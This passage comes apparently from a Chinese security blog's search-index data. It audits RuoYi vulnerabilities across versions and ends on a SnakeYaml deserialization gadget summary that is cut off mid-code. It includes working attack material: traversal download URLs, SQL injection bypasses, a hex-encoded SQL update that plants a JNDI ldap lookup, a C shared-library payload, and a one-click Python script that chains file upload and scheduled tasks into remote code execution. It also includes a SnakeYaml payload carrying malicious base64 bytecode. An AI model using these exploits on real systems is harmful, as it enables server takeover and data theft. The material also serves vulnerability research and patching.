/&gt;\n\nxml名称和Mapper接口的名称需要一致。\nwar包SSM项目默认是打包成war包，需要放到tomcat容器里才能允许，idea里支持直接配置tomcat并运行。\nSSH框架即：Struct2+Spring+Hibernate\n后面遇到具体例子再回来补\nSpringBoot框架这里目前没想到写什么，可能是还没遇到结构复杂的项目，之后来补充。\n","categories":["代码审计"],"tags":["Java安全","代码审计","Java开发"]},{"title":"若依各版本漏洞","url":"/2025/08/02/%E8%8B%A5%E4%BE%9D%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/","content":"&lt;&#x3D;4.2.0-Fastjson（未成功）这个搞了半天，最终还是没发现能够直接利用的方法，都需要手动开启autotype才行，网上好多文章都没提，挺坑的。另外，甚至连dns探测都用不了，因为键值对是通过hashmap.put的，顺序会乱。\n这里的fastjson版本为1.2.60\n漏洞发现直接ctrl+shift+f，搜索parseObject，搜索结果比较少，能一个个看：\n\n这里经过排查，com.ruoyi.generator.service.impl.GenTableServiceImpl#validateEdit里的是最好利用的。首先，上一个调用它的直接就是一个路由，意味着调试路径短。其次，路由传入的直接就是genTable，而genTable就是最后json字符串的来源，即我们可以直接控制json字符。\n下面看一下两个部分的代码：\n\neditSave中的genTableService是确定的，因为这个接口只有一个实现类且通过Autowired注解注入。\n看下面图片的代码，能发现，我们需要进入if才能触发parseObject。怎么进入呢，这里不妨先发几个包测试一下。路由是&#x2F;tool&#x2F;gen&#x2F;edit，根据含义比较容易找到：\n\n对编辑后的结果保存，抓包：\n\n能够找到和进入if相关的字段，我们改成tree就可以了。下面那三个参数就决定了json数据，待会儿看。\n当然ruoyi前端也可以直接改：\n\n改完会字段信息那儿再提交就行。\n提交数据包，跟进调试：\n\n这三个参数不就是上面数据包的最后一行吗，所以漏洞点就在这里。\n漏洞利用复现的过程中产生了几个问题：\n\nautotype不开有什么影响\n@type不在最前面有关系吗\njson里键值对的顺序怎么决定\n\n下面会一一解释\n1、dns探测\n这里用java.net.Inet4Address，java.net.URL在1.2.43被ban了。\n\n但是这里有个问题：\n\n处理成json后，val会在前面，这样就打不通了。\n那为什么会是这样的顺序？我们看一下这个json怎么来的：\n\n是通过getParams来的。\nParams怎么赋值：\n\nparams是个普通的HashMap，在我们发起请求时会自动通过hashMap.put赋值，这里面的顺序就是根据hash值排序了，所以我们没法直接控制。LinkedHashMap的话，顺序就可以控制了。\n解决完json顺序的问题，再看看为什么val在前就不行。\n当val在前时，val先会被当成普通数据处理，然后再处理@type，但是这样@type就没有参数了，所以会调用newInstance新建实例，可是Inet4Address没有public的无参构造，所以会报错，在这里抛出：\n\n这里强烈建议跟一遍调试，把json字符串到底是怎么处理的过一遍，在这里断点：\n\n把lexer的ch添加到监视，lexer是一个字符扫描器，负责识别json，ch是目前识别的字符：\n\n网上查了好久，不如自己跟一遍调试快，有不懂的代码或逻辑问ai就行。\n综上，由于我们无法决定键值对顺序，而且val在前也不行，所以没法打dns。\n另外，值得一提的是，Inet4Address在不开启autotype的情况下也是能打的，可以走这里进行类加载：\n\n这个在后面的版本好像修复了，是1.2.68吗，不能确定。\n2、jndi\n这里有shiro，可以用shiro里的一个类打jndi\n{&quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;, &quot;resourceName&quot;: &quot;ldap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;8e9b69&quot;}\n但是由于默认不开启autotype，是打不通的。\n\nautotype一关，@type就基本没用了（上面那种Inet4的例外）。\n这个类在1.2.68才ban，所以这里只是单纯没法加载才抛出：\n\n3、其他\n由于只能控制键值对内容，故只能使用单层的payload，大括号套大括号是用不了的。\n修复更新fastjson\n小结这个几乎花了一天，对fastjson还是不熟悉。这个漏洞其实限制很多，目前还不知道怎么利用。\n参考主要是fastjson相关的\nhttps://github.com/LeadroyaL/fastjson-blacklist\nhttps://github.com/lemono0/FastJsonParty\n&lt;&#x3D;4.5.0-任意文件下载这个比较简单：\n\n&#x2F;common&#x2F;download&#x2F;resource?resource&#x3D;&#x2F;profile&#x2F;..&#x2F;..&#x2F;flag.txt\n为什么要加&#x2F;profile，自己调试一下就懂了。\n之后多注意writeBytes方法，可能会有文件下载的相关漏洞。\n修复加了一个方法：\n\n对目录穿越和文件后缀都做了限制。\n&lt;&#x3D;4.7.8-定时任务&amp;任意文件下载漏洞发现前面为了防止目录穿越，作者增加了一个方法来过滤..&#x2F;，这样我们就没办法下载规定目录外的文件。然而，在我们刚开始使用&#x2F;common&#x2F;download&#x2F;resource路由时，很可能直接这样写参数?resource&#x3D;..&#x2F;..&#x2F;flag.txt，然后发现并没有成功下载。调试时一看，发现我们的目录根本没被拼接，只有配置文件里Profile的路径。\n那么，如果我们能修改Profile的路径，是不是就能直接指定文件位置，从而绕过过滤了呢？\n首先我们看一下Profile是怎么从配置文件到类里的。\n我们可以找到一个RouYiConfig类，这个类通过注解与配置文件关联，并且有Component注解，因此它是一个bean，同时我们的profile也在里面：\n\n并且，这里还提供了一个方法供你修改profile：\n\n所以，现在的目标就是调用setProfile来修改文件下载位置。\n漏洞利用在&lt;&#x3D;4.7.6时，利用会简单一点\n要怎么实现呢，靠定时任务。很多管理后台都会提供定时任务的功能，但是往往欠缺防护，会导致执行一些恶意任务。\n看一下RuoYI的定时任务要怎么执行：\n\n这里的cron表达式代表每5分钟执行一次，cron表达式可以去网上自己看一下。\n关键就在这里的调用目标字符串。我们先尝试直接用全限定名加方法的形式调用，发现会报错，说有违规字符串。调试一下发现，不允许出现com.ruoyi.common.config。看来作者是考虑到这点的：\n\n但是，我们通过bean方式调用就可以：ruoYIConfig.setProfile(“D:&#x2F;test.txt”)\n在最后一个白名单判断if中，只要bean是在com.ruoyi包中就都可以：\n\n因此我们的ruoYIConfig.setProfile(“D:&#x2F;test.txt”)也可以。\n设定好后，在任务状态处打开任务，然后再去&#x2F;common&#x2F;download&#x2F;resource?resource&#x3D;any.txt下请求，就能下载我们在profile中设置的文件了。\n在&lt;&#x3D;4.7.8时，我们不能直接创建修改Config的定时任务了，但是可以通过sql注入来修改已经创建的合法任务，利用过程差不多，就是加了一个sql注入的过程\n修复加载bean的时候，使用黑白名单。刚刚是只用了白名单com.ruoyi，现在把全限定名调用里的黑名单也加上了：\n\n&lt;&#x3D;4.6.1-SQL注入漏洞发现ctrl+shift+f 搜索字符 ${ ：\n\n发现Mapper.xml中存在使用$ 来注入参数，可能存在拼接问题。\n挑选一个审计：\n\n解释一下，${params.dataScope}指的是，传入的参数中有一个字段名为params，这个字段可能是HashMap这种键值对，所以可以通过params.dataScope选择具体键值对。\n往前找对应的mapper接口：\n\n然后找对应的实现：\n\n最终找到路由处的用法：\n\n这里对应的父路由是&#x2F;system&#x2F;dept：\n\n&#x2F;list对应的功能，应该就是列出列表，尝试查询：\n\n这样就找到漏洞点了。\n漏洞利用可以使用的字段有com.ruoyi.common.core.domain.entity.SysDept和它的父类com.ruoyi.common.core.domain.BaseEntity\n而params就在父类中，是一个hashmap，所以可以这样传参：\n\n能实现报错注入。\n其他的注入点也有，这里列举一些，寻找方式同上：\n&#x2F;system&#x2F;role&#x2F;list\n&#x2F;system&#x2F;role&#x2F;export\n&#x2F;system&#x2F;user&#x2F;list\n&#x2F;system&#x2F;user&#x2F;export\n&#x2F;system&#x2F;role&#x2F;authUser&#x2F;allocatedList\n&#x2F;system&#x2F;role&#x2F;authUser&#x2F;unallocatedList\n漏洞修复commit编号e1cab589f2acf4e835ad5ab310bdbe71f2dd646d，通过织入点的方式，对所有有datascope注解的方法都进行了过滤，因此params相关的注入被修复。\n\n4.7.1-4.7.8-SQL注入+绕过漏洞利用4.7.1版本开始，增加了一个创建表的功能，可以从这里注入。\n路由在&#x2F;tool&#x2F;gen&#x2F;createTable\n\n\n这里运行执行一个create操作，并且会直接执行。\n所以可以通过create fake_table as select extractvalue(1,database())的方法进行报错注入\n在后面的版本，增加了过滤功能：\n\n会对常见注入关键字进行过滤。不过StringUtils.indexOfIgnoreCase的匹配原理是，先将value按空格split，再去和keyword一一匹配。所以可以通过select&#x2F;**&#x2F;extractvalue的方式绕过，因为这样select和后面的就成为一个整体了。\n修复4.7.6版本开始，不会回显具体报错：\n\n但是到4.7.9版本，还是可以使用时间注入。\n4.8.0版本，黑名单更加全面：\n\n&lt;&#x3D;4.7.8-定时任务SQL&amp;RCE漏洞发现前面学习了若依的SQL注入，但除了从Controller注入，还有一种另外的方式，那就是直接调用Service层的方法。因为所有过滤操作都是在Controller层实现的，所以一旦能直接操纵Service层的方法，那所有过滤操作就形同虚设了，只要Mapper.xml中还是使用${}，那我们就可以尝试注入。\n正好，若依里给我们提供了定时任务的功能，而且正好没有将sql操作相关的Service类列入黑名单，所以可以直接操作Service方法进行注入，如下图：\n这个方法在上面sql注入绕过中也出现过。\n定时任务在设定时，对一些关键词是有过滤的，比如不允许出现ldap，ldaps，rmi等：\n但是有了sql注入，我们就可以先设置合法任务，再修改成非法任务。\n漏洞利用1、任意创建一个定时任务\n\n2、创建第二个任务，用于修改第一个任务，由于创建任务调用的目标字符串不允许出现ldap，所以在sql注入时要16进制编码绕过：\ngenTableServiceImpl.createTable(&quot;update sys_job set invoke_target=0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a35303338392f6337386433332729 where job_id=100&quot;)\n\njavax.naming.InitialContext.lookup(‘ldap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;c78d33’)\n另外，在创建任务时，还有一种绕过方法，就是在所有协议中间加一个单引号。ld’ap，ht’tp，这样就行。\n3、运行一下创建的sql注入任务：\n\n然后就能发现创建的第一个任务的内容发生变化，变成了ldap任务，执行后即可触发jndi。\n修复这里讲一下定时任务修复的发展史\n1、4.7.0之前的版本，只对rmi协议进行了黑名单。下面是4.6.2\n\n2、4.7.0对http，https，ldap，ldaps进行了黑名单：\n\n3、4.7.1对一些恶意类进行了黑名单：\n\n4、4.7.6开始？不确定，增加了黑白名单，先黑名单，再白名单，白名单为com.ruoyi\n\n5、4.7.9开始，进一步完善黑名单和白名单：\n\n这样sql+RCE的方法就用不了了\n但是注意，这里的白名单匹配是包含即可，而不是严格要求匹配，这也为4.8.0的绕过做下铺垫。\n&lt;&#x3D;4.8.1-定时任务绕过&amp;文件上传&amp;JNI漏洞发现这里的利用思路还是很巧妙的，先解释一些总体思路。\n计划任务创建时，使用了黑名单+白名单。我们无法使用黑名单里的类，但是可以想办法让白名单的范围扩大。白名单原本是com.ruoyi.quartz.task，作者的本意是只能调用这个包里的类。但是，白名单匹配时，使用的是contains，也就是说，只要定时任务里有白名单的字符串就行了。这就给了我们绕过的机会。\nJava中有一种JNI机制，可以加载外部的链接库，并加载里面的构造函数。\n我们可以上传一个JNI文件，JNI文件名包含com.ruoyi.quartz.task，再通过定时任务更改文件后缀，再通过定时任务调用类去加载JNI文件。由于JNI文件名包含了白名单内容，所以可以绕过白名单，实现RCE。上传后又可以通过定时任务更改文件后缀，这样就可以加载JNI文件了。\n现在来看细节。\n在白名单过滤时，当包名超过一层时，就会进入全限定名的if，而不是bean的if：\n\n这样只需要满足定时任务中包含白名单字符串即可。\n定时任务的触发逻辑在com.ruoyi.quartz.util.JobInvokeUtil，里面的getMethodParams用于获取执行参数，具体如下：\n\n能够看出，这里能够接受的参数只有：String，boolean，long，double，以及能够被转换成Integer的类。所以在参数方法，我们的选择是是否有限的。\n另外，invokeMethod时，我们只能调用public方法：\n\n综上，我们的条件是：\n1、调用的类及参数不能包含黑名单的字符串\n2、调用的类及参数一定要包含白名单的字符串\n3、调用的参数类型有限制\n4、调用的方法只能是public方法\n另外，我们可以进行文件上传：\n\n会返回上传的位置：\n\n漏洞利用1、编译c文件，windows编译成dll，mac编译成dylib，linux编译成.so\n#include &lt;stdlib.h&gt;__attribute__((constructor))static void run() &#123;system(&quot;calc&quot;);&#125;\n\ngcc -shared -o evil.dll evil.c\t需要MinGW\ngcc -fPIC -shared -o evil.so evil.c\ngcc -dynamiclib -o evil.dylib evil.c\n将编译后的文件重命名为：com.ruoyi.quartz.task.dll.txt\n2、利用python脚本发包\nimport requestsurl = &quot;http://127.0.0.1:4800/common/upload&quot;# 准备上传的文件内容files = &#123;    &#x27;file&#x27;: (&#x27;com.ruoyi.quartz.task.dll.txt&#x27;, open(&#x27;com.ruoyi.quartz.task.dll.txt&#x27;, &#x27;rb&#x27;))&#125;headers = &#123;    &#x27;Cookie&#x27;: &#x27;JSESSIONID=5324115e-f2e1-4021-ab71-fbe64ddfff3e&#x27;&#125;# 配置代理，HTTP 和 HTTPS 都指向 Burp 的监听地址proxies = &#123;    &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;,    &quot;https&quot;: &quot;http://127.0.0.1:8080&quot;&#125;resp = requests.post(url, files=files, proxies=proxies, headers=headers)print(resp.text)\n\n代理部分可以去掉\n记录文件路径：\n\n这里的路径不完全正确，如果没有重新设置过文件上传路径，windows系统应该在”D:\\ruoyi\\uploadPath\\upload”，后面再拼接日期等。\n如果修改过配置文件中的上传路径，就得猜测路径了。\n猜测的话可以搭配ch.qos.logback.core.FileAppender.openFile 使用  因为会默认创建一个空文件 猜测前缀即可\nch.qos.logback.core.FileAppender.openFile(‘前缀+&#x2F;uploadPath&#x2F;download&#x2F;com.ruoyi.quartz.task.log’) 之后访问&#x2F;profile&#x2F;前缀+&#x2F;uploadPath&#x2F;download&#x2F;com.ruoyi.quartz.task.log 来判断\n3、设置定时任务并执行修改文件后缀为dll\nch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying(“..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ruoyi&#x2F;uploadPath&#x2F;upload&#x2F;2025&#x2F;08&#x2F;01&#x2F;com.ruoyi.quartz.task.dll_20250801153101A004.txt”,”..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ruoyi&#x2F;uploadPath&#x2F;upload&#x2F;2025&#x2F;08&#x2F;01&#x2F;com.ruoyi.quartz.task.dll_20250801153101A004.dll”)\n4、定时任务加载dll文件\ncom.sun.glass.utils.NativeLibLoader.loadLibrary(“..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ruoyi&#x2F;uploadPath&#x2F;upload&#x2F;2025&#x2F;08&#x2F;01&#x2F;com.ruoyi.quartz.task.dll_20250801153101A004”)\n下面是一键python脚本，只适用于windows，且没有更改过默认文件上传路径的情况，\nimport jsonimport requests# 更改为目标urlbase_url = &quot;http://127.0.0.1:4810&quot;# 记得替换cookieheaders = &#123;    &#x27;Cookie&#x27;: &#x27;JSESSIONID=ef41ab5c-d8b4-4802-a8a7-0928c67b91e3;&#x27;&#125;# 配置代理，HTTP 和 HTTPS 都指向 Burp 的监听地址proxies = &#123;    &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;,    &quot;https&quot;: &quot;http://127.0.0.1:8080&quot;&#125;def fileUpload():    url = f&quot;&#123;base_url&#125;/common/upload&quot;    file = &quot;com.ruoyi.quartz.task.txt&quot;    # 此dll为windows下弹出计算器，可自行更改，可配合C2    files = &#123;        &#x27;file&#x27;: (f&#x27;&#123;file&#125;&#x27;, open(&#x27;calc.dll&#x27;, &#x27;rb&#x27;))    &#125;    resp = requests.post(url, files=files, headers=headers)    print(resp.text)    # 自动获取上传后的文件名    fileName_txt = json.loads(resp.text)[&quot;fileName&quot;].replace(&#x27;/profile/&#x27;, &#x27;&#x27;)    fileName_dll = fileName_txt.replace(&#x27;.txt&#x27;, &#x27;.dll&#x27;)    return fileName_txt, fileName_dlldef jobsRemove():    # 删除已存在的任务    burp0_url = f&quot;&#123;base_url&#125;/monitor/job/remove&quot;    burp0_data = &#123;&quot;ids&quot;: &quot;114,514&quot;&#125;    resp = requests.post(burp0_url, headers=headers, data=burp0_data)    print(&quot;任务删除情况：&quot; + resp.text)def jobExtensionCreate(fileName_txt, fileName_dll):    burp0_url = f&quot;&#123;base_url&#125;/monitor/job/add&quot;    # Windows默认路径情况；若更改过文件上传路径，则需要猜测路径前缀    finalFileName_txt = f&quot;../../../../../../../../../../../../../ruoyi/uploadPath/&#123;fileName_txt&#125;&quot;    finalFileName_dll = f&quot;../../../../../../../../../../../../ruoyi/uploadPath/&#123;fileName_dll&#125;&quot;    burp0_data = &#123;&quot;jobId&quot;: &quot;114&quot;, &quot;createBy&quot;: &quot;admin&quot;, &quot;jobName&quot;: &quot;ExtensionToDll&quot;, &quot;jobGroup&quot;: &quot;DEFAULT&quot;,                  &quot;invokeTarget&quot;: f&quot;ch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying(\\&quot;&#123;finalFileName_txt&#125;\\&quot;,&quot;                                  f&quot;\\&quot;&#123;finalFileName_dll&#125;\\&quot;)&quot;, &quot;cronExpression&quot;: &quot;* * * * * ?&quot;, &quot;misfirePolicy&quot;: &quot;1&quot;,                  &quot;concurrent&quot;: &quot;1&quot;, &quot;remark&quot;: &#x27;&#x27;&#125;    resp = requests.post(burp0_url, headers=headers, data=burp0_data)    print(&quot;修改扩展名任务创建情况：&quot;  + resp.text)    return finalFileName_dlldef jobExtensionRun():    burp0_url = f&quot;&#123;base_url&#125;/monitor/job/run&quot;    # 跟上面的jobId保持一致    burp0_data = &#123;&quot;jobId&quot;: &quot;114&quot;&#125;    resp = requests.post(burp0_url, headers=headers, data=burp0_data)    print(&quot;修改扩展名任务执行情况：&quot; + resp.text)    def jobJniCreate(finalFileName_dll):    # 去掉扩展名    finalFileName = finalFileName_dll[:len(finalFileName_dll)-4:]    burp0_url = f&quot;&#123;base_url&#125;/monitor/job/add&quot;    burp0_data = &#123;&quot;jobId&quot;: &quot;514&quot;, &quot;createBy&quot;: &quot;admin&quot;, &quot;jobName&quot;: &quot;JNILoader&quot;, &quot;jobGroup&quot;: &quot;DEFAULT&quot;,                  &quot;invokeTarget&quot;: f&quot;com.sun.glass.utils.NativeLibLoader.loadLibrary(\\&quot;&#123;finalFileName&#125;\\&quot;)&quot;,                  &quot;cronExpression&quot;: &quot;* * * * * ?&quot;, &quot;misfirePolicy&quot;: &quot;1&quot;, &quot;concurrent&quot;: &quot;1&quot;, &quot;remark&quot;: &#x27;&#x27;&#125;    resp = requests.post(burp0_url, headers=headers, data=burp0_data)    print(&quot;jni任务创建情况：&quot; + resp.text)def jobJniRun():    burp0_url = f&quot;&#123;base_url&#125;/monitor/job/run&quot;    burp0_data = &#123;&quot;jobId&quot;: &quot;514&quot;&#125;    resp = requests.post(burp0_url, headers=headers, data=burp0_data)    print(&quot;jni任务运行情况：&quot; + resp.text)def test():    s = &quot;12345678&quot;    print(s[:len(s)-4:])if __name__ == &quot;__main__&quot;:    # test()    fileNames = fileUpload()    jobsRemove()    finalFileName_dll = jobExtensionCreate(fileNames[0], fileNames[1])    jobExtensionRun()    jobJniCreate(finalFileName_dll)    jobJniRun()\n\n修复最新的4.8.1版本还未修复。\n我感觉把那个JNI加载的类加入定时任务黑名单就好了。同时把白名单改成com.xxx开头。\n参考【安全研究】若依4.8.0版本计划任务RCE研究\n&lt;&#x3D;4.7.1-SSTI漏洞发现在进行模板渲染时，对fragment进行了直接拼接，导致可以执行表达式注入：\n\n漏洞利用${T()}不行，T必须与()之间有空格，这是为了绕过thymeleaf组件自带的防护。cacheName不能为空。\n直接发包即可：\n\ndns也能成功：\n\n一共四个路由存在漏洞：\n&#x2F;monitor&#x2F;cache&#x2F;getKeys\n&#x2F;monitor&#x2F;cache&#x2F;getNames\n&#x2F;monitor&#x2F;cache&#x2F;getValue\n&#x2F;demo&#x2F;form&#x2F;localrefresh&#x2F;task\n低版本前三个路由可能不存在，第四个路由在4.5.0版本存在，4.2.0版本不存在，中间版本未测试。\n存在这个，则前三个路由存在：\n\n只要存在：\n\n则第四个路由存在。\n漏洞修复thymeleaf 3.0.12版本是存在漏洞的，所以在4.7.2升级成了3.0.15版本，修复了漏洞。\n&lt;4.6.2 shiro721反序列化application.yml里写了默认的shiro密钥：\n\n后面的步骤参考shiro反序列化即可。\n总结SQL注入1、4.7.8之前&#x2F;tool&#x2F;gen&#x2F;createTable都可以用来update，可以结合定时任务使用。定时任务中的黑名单可以在注入时使用16进制绕过。\n2、其他4.7.1–4.7.5和&lt;&#x3D;4.6.1的可以用来拖库\n定时任务1、可以通过jndi或者jni实现RCE，往往配合SQL注入\n2、可以修改配置文件，配合任意文件下载\n任意文件下载1、&lt;&#x3D;4.7.8都能用，&lt;&#x3D;4.5.0可以直接用，高版本要配合定时任务\n审计原则1、sql注入，mybatis的可以搜${\n2、文件上传，解压缩这种地方多注意，看看目录是否过滤或可控\n3、定时任务\n4、注意多种漏洞结合\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"SnakeYaml利用总结","url":"/2025/08/03/SnakeYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/","content":"前言SnakeYaml在2.0之前的版本默认不开启安全模式，会自动调用构造方法和setter方法来实例化一个类，因此存在很多反序列化打法。这里总结一下常用的链子，为基于JavaBean机制的反序列化积累知识。\n不出网JDK原生从这篇文章学习：奇安信攻防社区-SnakeYaml 不出网 RCE 新链（JDK原生链）挖掘\n适用于jdk8，不需要出网，实用性很高，能直接RCE。\n简要分析1、sink\n在CC链中，有一个TrAXFilter类，它的构造方法能够触发newTransformer，从而通过TemplatesImpl触发字节码加载。TemplatesImpl里有几个关键的字段需要赋值，分别是：_bytecodes，_tfactory，_name 。现在让我们看看能不能通过构造方法来为这几个赋值，如果能的话，很可能就能使用SnakeYaml进行反序列化。\n有两个protected构造方法：\n\n上面那个跟进init：\n\n非常巧，我们需要的几个字段都能在构造方法中赋值。\n2、byte[][]如何写入.yml\nbyte[] 对应 !!binary xxxxx，但是byte[][]应该怎么写？\n这里直接给出文章中的答案，[!!binary xxxxx]\n可以通过序列化一个有byte[][]字段的对象来观察。\n3、发现报错\n初步的poc：\n!!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl [  [!!binary SGVsbG8=],  &quot;heihu577&quot;,  !!java.util.Properties &#123;&#125;,  !!int 0,  !!com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl &#123;&#125;]\n\n但是却报错：\n\n说是找不到合适的构造方法。\n我们跟进报错，去调试一下：\n\n上面这张图，首先将参数数量一致的构造方法添加进List，然后进行判断。如果构造方法是唯一的，就会将yaml文件中读取到的数据，全部转换为符合构造函数参数的数据类型。\n下面这张图，在构造方法大于1个时进入。我们目前就属于这种情况。问题出现在isAssignbleFrom。\n\n虽然我们传入的是一个bytes[][]，但是解析后变成了ArrayList，而byte[][]和ArrayList是不满足if的，也就是byte[][] &#x3D; new ArrayList()是不成立的，如下图。所以在这儿会抛出错误。\n\n4、解决报错\n由于TemplatesImpl是硬编码，不能修改的。所以我们只能想办法让传入的byte[][]先从ArrayList转换成byte[][]，再进入if。\n这里运用的方法是先创建引用类型，而后引用。\n这里作者找到了这样一个类 com.sun.javafx.iio.ImageFrame 这个类有两个不同参数的构造方法，且构造方法中有byte[][]类型的参数：\n\n最终payload：\n[  !!com.sun.javafx.iio.ImageFrame [null, null, 0, 0, 0, &amp;A [!!binary &quot;yv66vgAAADQAXwoAEgA0BwA1CgACADQHADYKADcAOAoAOQA6CgACADsJADwAPQcAPgoACQA/CgBAAEEKAEIAQwgARAoAQgBFBwBGBwBHCgAQAEgHAEkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExjb20vaGVpaHU1NzcvYmVhbi9FdmlsOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZlbmNvZGUBAAJbQgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwBKAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwBGAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwAEwAUAQAqb3JnL2FwYWNoZS90b21jYXQvdXRpbC9jb2RlYy9iaW5hcnkvQmFzZTY0AQAWY29tL2hlaWh1NTc3L2JlYW4vRXZpbAcASwwATABNBwBODABPAFAMAB4AUQcAUgwAUwBUAQAQamF2YS9sYW5nL1N0cmluZwwAEwBVBwBWDABXAFgHAFkMAFoAWwEABGNhbGMMAFwAXQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwAEwBeAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAK2NvbS9zdW4vb3JnL2FwYWNoZS9iY2VsL2ludGVybmFsL1JlcG9zaXRvcnkBAAtsb29rdXBDbGFzcwEASShMamF2YS9sYW5nL0NsYXNzOylMY29tL3N1bi9vcmcvYXBhY2hlL2JjZWwvaW50ZXJuYWwvY2xhc3NmaWxlL0phdmFDbGFzczsBADRjb20vc3VuL29yZy9hcGFjaGUvYmNlbC9pbnRlcm5hbC9jbGFzc2ZpbGUvSmF2YUNsYXNzAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGKFtCKVtCAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEABShbQilWAQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEABAASAAAAAAAFAAEAEwAUAAEAFQAAAC8AAQABAAAABSq3AAGxAAAAAgAWAAAABgABAAAADgAXAAAADAABAAAABQAYABkAAAAJABoAGwABABUAAABeAAQAAgAAACK7AAJZtwADEgS4AAW2AAa2AAdMsgAIuwAJWSu3AAq2AAuxAAAAAgAWAAAADgADAAAAEAATABEAIQASABcAAAAWAAIAAAAiABwAHQAAABMADwAeAB8AAQABACAAIQACABUAAAA/AAAAAwAAAAGxAAAAAgAWAAAABgABAAAAHwAXAAAAIAADAAAAAQAYABkAAAAAAAEAIgAjAAEAAAABACQAJQACACYAAAAEAAEAJwABACAAKAACABUAAABJAAAABAAAAAGxAAAAAgAWAAAABgABAAAAJAAXAAAAKgAEAAAAAQAYABkAAAAAAAEAIgAjAAEAAAABACkAKgACAAAAAQArACwAAwAmAAAABAABACcACAAtABQAAQAVAAAAZgADAAEAAAAXuAAMEg22AA5XpwANS7sAEFkqtwARv7EAAQAAAAkADAAPAAMAFgAAABYABQAAABYACQAZAAwAFwANABgAFgAaABcAAAAMAAEADQAJAC4ALwAAADAAAAAHAAJMBwAxCQABADIAAAACADM=&quot;], null],  !!com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter [    !!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl [*A,&quot;heihu577&quot;,!!java.util.Properties &#123;&#125;,!!int 0,!!com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl &#123;&#125;]  ]]\n\nbytecode生成：\npublic class ByteCodeGen&#123;    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException &#123;        byte[] bytes = genByte(&quot;calc&quot;);        String s = Base64.getEncoder().encodeToString(bytes);        System.out.println(s);    &#125;    public static byte[] genByte(String cmd) throws NotFoundException, CannotCompileException, IOException &#123;        ClassPool pool = ClassPool.getDefault();        CtClass sink = pool.makeClass(&quot;Sink&quot;);        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);        sink.setSuperclass(superClass);        CtConstructor static_block = 